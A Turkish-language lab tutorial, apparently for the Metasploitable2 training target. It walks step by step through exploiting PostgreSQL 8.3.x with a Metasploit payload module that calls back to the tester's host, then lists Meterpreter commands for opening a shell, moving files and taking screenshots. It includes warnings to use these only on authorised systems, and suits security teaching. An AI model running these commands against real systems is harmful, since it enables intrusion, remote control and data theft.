Metasploitable2’deki PostgreSQL'in DB 8.3.0 - 8.3.7 sürümünde, **internet araması** ile tespit edilebilen bir güvenlik açığı bulunur.  
Genellikle ilk sonuçlarda **Rapid7** tarafından hazırlanmış bir **Metasploit modülü** yer alır.

---

## 🚀 Exploit Kullanımı (Metasploit Framework)

1. **Metasploit Framework’ü başlat**  
    Bu komut ile Metasploit konsolunu açıyoruz.

```bash
msfconsole
```

2. **Açığı kullanacak modülü seç**  
    Burada PostgreSQL exploit modülünü yüklüyoruz.

```bash
use exploit/linux/postgres/postgres_payload
```

3. **Hedef ve gerekli parametreleri ayarla**
    - `show targets` → Hedef türlerini gösterir
    - `set target 0` → Varsayılan hedefi seçer
    - `show options` → Modülün mevcut ayarlarını listeler
    - `set rhosts <target ip>` → Hedef IP adresini ayarlar
    - `set lhosts <client ip>` → Bilgilerin geleceği IP adresini ayarlar

```bash
show targets
set target 0
show options
set rhosts <target ip>
show options
set lhosts <client ip>
```

4. **Exploit’i çalıştır**
    - `-j` → Arka planda (background) çalıştırır
    - `-z` → Oturumu otomatik olarak kapatmaz

```bash
exploit -j -z
```

5. **Oturumları görüntüle ve bağlan**
    - `sessions -l` → Açık tüm oturumları listeler
    - `sessions 1` → 1 numaralı oturuma bağlanır

```bash
sessions -l
sessions 1
```

6. **İşlem bittiğinde çıkış yap**
    - `background` → Oturumu arka plana alır
    - `exit` → Metasploit’ten çıkar

```bash
background
exit
```

---

⚠️ **Not:** Bu işlem yalnızca **laboratuvar ortamında** ve **izinli sistemlerde** yapılmalıdır.  
Aksi halde **yasal sorunlar** doğurabilir! 🚫

---

## 🛠️ Meterpreter Kullanımı

- **Meterpreter**, Metasploit Framework ile elde edilen bir oturum türüdür.  
- Hedef cihaza bağlanıldığında, bu oturum üzerinden **dosya yönetimi, komut çalıştırma, ağ taraması, şifre bilgisi çıkarma** gibi çok sayıda işlem yapılabilir.  
- Tüm komutların listesi için:  
```bash
meterpreter --help
```

---

### 📜 Temel Komutlar ve Açıklamaları

1. **Hedef sistem bilgilerini öğrenme**  
```bash
sysinfo
```
Hedef işletim sistemi, mimarisi, bilgisayar adı gibi bilgileri gösterir.

2. **Komut satırı açma**  
```bash
shell
```
Hedefte klasik bir sistem kabuğu (cmd, bash vb.) açar.

3. **Dosya sistemi gezme**  
```bash
ls
cd <klasör_yolu>
```
`ls` → bulunduğun dizindeki dosyaları listeler.  
`cd` → klasör değiştirir.

4. **Dosya indirme ve yükleme**  
```bash
download <hedef_dosya_yolu>
upload <yerel_dosya_yolu>
```
Hedeften yerel makineye dosya indirir veya yerelden hedefe dosya yükler.

5. **Ekran görüntüsü alma**  
```bash
screenshot
```
Hedef cihazın o anki ekran görüntüsünü kaydeder.

6. **Ağ bağlantılarını görüntüleme**  
```bash
netstat
```
Hedef sistemdeki açık portlar ve ağ bağlantılarını gösterir.

7. **Oturumu sonlandırma**  
```bash
exit
```
Meterpreter oturumunu kapatır.

---

⚠️ **Uyarı:** Bu işlemler yalnızca **izinli test ortamlarında** yapılmalıdır.  
Yetkisiz kullanım **yasal suçtur**! 🚫
